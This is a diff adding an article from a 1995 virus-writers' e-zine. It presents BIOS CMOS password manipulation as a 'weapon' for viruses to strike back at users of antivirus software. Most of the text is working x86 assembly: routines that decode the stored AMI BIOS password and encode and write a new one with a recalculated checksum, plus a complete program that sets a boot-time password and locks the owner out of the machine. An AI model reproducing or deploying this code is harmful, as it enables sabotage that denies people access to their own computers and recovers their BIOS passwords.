@@ -1,0 +1,317 @@
+
+	  ÜÜ                  Û
+	 ßßß Monthly Magazine Û For VirMakers.                  APR '95
+	 ßÛÛ ßßßßßßßßßßßßßßßß Û ßßßßßßßßßßßßßßßßßßß ß ßßßßÞßßß  ÛÛßßßÛÛ
+	  ÞÛ ÛßÜ Ûßß Üßß Üßß ÜÛÜ Üßß ÛßÛ    Ý Û ÜßÛ Û Üßß ÛÜÜ   ÛÛ ßßÛÛ
+	   Û Û Û Ûß  Ûß  Û    Û  Ûß  Û Û    Û Û Û Û Û Û   Û     ÛÛ Û ÛÛ
+	   Û Þ Þ Þ   ÞÜÜ ÞÜÜ  Þ  ÞÜÜ ÞÜß     ßÛ ßÜÛ Þ ÞÜÜ ÞÜÜÜ  ÛÛÜÜÜÛÛ
+	   Þ ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ  ÜÜÜÜÜÜÜ
+	     (C) Copyright, 1994-95, by STEALTH group, unLtd.
+
+----------------------------------------------------------------------------
+					     (C) IntMaster,Kiev-1995
+
+ It's hard to spread viruses in our cruel times.
+ There are a mass of programs which kill virii at once, cutting the most
+ important parts of its body. When faced by this aggression we must
+ respond similarly. To each strike we must always have an answering strike
+ but stronger, harder to our enemy.
+    We'll teach them to RESPECT us.
+ 
+ Ok, let's consider the password in CMOS. This is a new and sudden weapon.
+
+    The information placed below applies to AMI BIOS 12/12/91.
+ But I think that this encryption algorithm is used in other AMI versions.
+ If you have other BIOS versions, Sourcer may be very helpful for further
+ investigation.
+
+ The encrypted password is in 38h-3dh of CMOS memory.  If it isn't
+ installed these bytes contain zeroes.
+ Password Ask Flag is in byte 34h(bit 6):
+		bit 6 = 1  - password asked in the POST session of BootUp.
+		bit 6 = 0  - password asked only for entery to SetUp.
+  After changing the password you must recount the second CMOS checksum.
+  Otherwise during BootUp the message:
+			"CMOS Checksum failure." 
+  appears and all the CMOS stuff will be cleared to default.
+  This checksum is the sum of bytes 34h-3dh and 40h-6fh and is saved in
+  3eh(High byte)-3Fh(Low byte).
+
+  Now to begin work.
+
+  Some necessary procedures:
+
+#########################################################
+	;---------------------------------
+	;--Used-to-read-byte-from-CMOS----
+	;---------------------------------
+	;--ARGUMENTS: al=CMOS address ----
+	;---------------------------------
+	;--RETURNS: al=read byte ---------
+	;---------------------------------
+	read    proc near
+		and al,7fh
+		out 70h,al
+		jmp $+2 ;i/o delay
+		jmp $+2
+		in  al,71h
+		ret
+	read    endp
+#########################################################
+	;---------------------------------
+	;--Write-byte-to-CMOS-------------
+	;---------------------------------
+	;--ARGUMENTS: al=CMOS address ----
+	;             dh=byte to write
+	;---------------------------------
+	;--RETURNS:                  -----
+	;---------------------------------
+	write   proc near
+		and al,7fh
+		out 70h,al
+		jmp $+2
+		mov al,dh
+		out 71h,al
+		ret
+	write   endp
+#########################################################
+	;---------------------------------
+	;-Count-and-write-CMOS-second-----
+	;-control-sum-(bytes 3eh-3fh)-----
+	;---------------------------------
+	sum     proc near
+		xor ah,ah
+		xor dx,dx
+		mov bl,34h
+		mov cx,3Dh-34h+1
+	l:      mov al,bl
+		call read
+		add dx,ax
+		inc bl
+		loop l
+		mov bl,40h
+		mov cx,6fh-40h+1
+	ll:     mov al,bl
+		call read
+		add dx,ax
+		inc bl
+		loop ll
+		mov al,3eh
+		call write
+		mov al,3fh
+		xchg dl,dh
+		call write
+		ret
+	sum     endp
+	;The algorithm for counting the sum may be improved.
+	;I reccommend not counting the sum of all bytes, but get
+	;only difference. This method gives compatibility
+	;with other CMOS versions.
+#########################################################
+	;---------------------------------
+	;---Coding--byte------------------
+	;---------------------------------
+	;--ARGUMENTS: al=byte    ---------
+	;---------------------------------
+	;--RETURNS: al=crypted byte-------
+	;---------------------------------
+	ccod proc near
+		test al,0c3h
+		jp n
+		stc
+	n:      rcr al,1
+		ret
+	ccod endp
+
+#########################################################
+	;---------------------------------
+	;-Returns-undecoded-password-------
+	;---------------------------------
+	;-ARGUMENTS:ES:[DI]-saving--------
+	;           for password
+	;---------------------------------
+	;-RETURNS: ES:[DI]->password,-----
+	;          ended with zero.
+	;          If first byte is
+	;          zero-no password
+	;          installed
+	;---------------------------------
+	decode proc near
+		cld
+		mov dh,37h
+		mov al,dh
+		call read
+		and al,0f0h
+		mov bl,al
+	 next:  cmp dh,3dh
+		je exit
+		inc dh
+		mov al,dh
+		call read
+		cmp al,0
+		jz exit
+		xor dl,dl
+		xchg al,bl
+	 f:     call ccod
+		inc dl
+		cmp al,bl
+		jne f
+		mov byte ptr es:[di],dl
+		inc di
+		jmp short next
+	 exit:  xor al,al
+		stosb
+		ret
+	decode  endp
+#########################################################
+	;--------------------------------
+	;-Install-new-CMOS-password------
+	;--------------------------------
+	;-ARGUMENTS:DS:[SI]->password----
+	;       to install.Must be
+	;       string of length 6.
+	;       If password has
+	;       length <6.Zeroes(0)
+	;       must be added.
+	;--------------------------------
+	;-RETURNS:              ---------
+	;--------------------------------
+	psw     proc near
+		mov cx,6
+		mov bl,37h
+		mov al,bl
+		call read
+		and al,0f0h
+		mov bh,al
+	l3:     lodsb
+		cmp al,0
+		jnz l5
+		mov bh,al
+		jmp l6
+	l5:     xchg al,bh
+		call ccod
+		xchg bh,al
+		dec al
+		jnz l5
+	l6:     mov dh,bh
+		inc bl
+		mov al,bl
+		call write
+		loop l3
+		call sum
+		ret
+	psw endp
+#########################################################
+
+  At the end of this article I have placed a small program
+  which installs a password ('QWERTY',for example) to CMOS.
+  In the CMOS' versions which differ from the present,
+  due to crypting methods or anything else, you may set up an
+  unknown password so you will not be able to access your
+  machine
+    Be CAREFUL ...
+
+;--------------------------------------------------------
+code    segment
+	assume cs:code,ss:code,ds:code
+	org 100h
+main    proc near
+begin:
+	lea si,psw ;DS:[SI]->Password
+
+	mov al,34h      ;Password will be asked
+	mov dh,al       ;in BootUp.
+	call read
+	or al,01000000b
+	xchg al,dh
+	call write
+
+	mov cx,6
+	mov bl,37h
+	mov al,bl
+	call read
+	and al,0f0h
+	jnz ok
+	mov al,10h
+	;If AL=0 password crypted
+	;to zero line.
+	;Then change AL
+ok:     mov bh,al
+
+l3:     lodsb
+	cmp al,0    ;Crypt and write to
+	jnz l5      ;CMOS
+	mov bh,al
+	jmp l6
+l5:     xchg al,bh
+	call ccod
+	xchg bh,al
+	dec al
+	jnz l5
+l6:     mov dh,bh
+	inc bl
+	mov al,bl
+	call write
+	loop l3
+
+	call sum  ; Don't forget the checksum!!!
+
+	ret
+main    endp
+
+read    proc near
+	and al,7fh
+	out 70h,al
+	jmp $+2
+	jmp $+2
+	in  al,71h
+	ret
+read    endp
+
+write   proc near
+	and al,7fh
+	out 70h,al
+	jmp $+2
+	mov al,dh
+	out 71h,al
+	ret
+write   endp
+
+sum     proc near
+	xor ah,ah
+	xor dx,dx
+	mov bl,34h
+	mov cx,3Dh-34h+1
+l:      mov al,bl
+	call read
+	add dx,ax
+	inc bl
+	loop l
+	mov bl,40h
+	mov cx,6fh-40h+1
+ll:     mov al,bl
+	call read
+	add dx,ax
+	inc bl
+	loop ll
+	mov al,3eh
+	call write
+	mov al,3fh
+	xchg dl,dh
+	call write
+	ret
+sum     endp
+
+ccod    proc near
+	test al,0c3h
+	jp n
+	stc
+n:      rcr al,1
+	ret
+ccod    endp
+
+psw     db 'QWERTY' ; A place for fantasy
+
+code    ends
+	end begin
+;--------------------------------------------------------
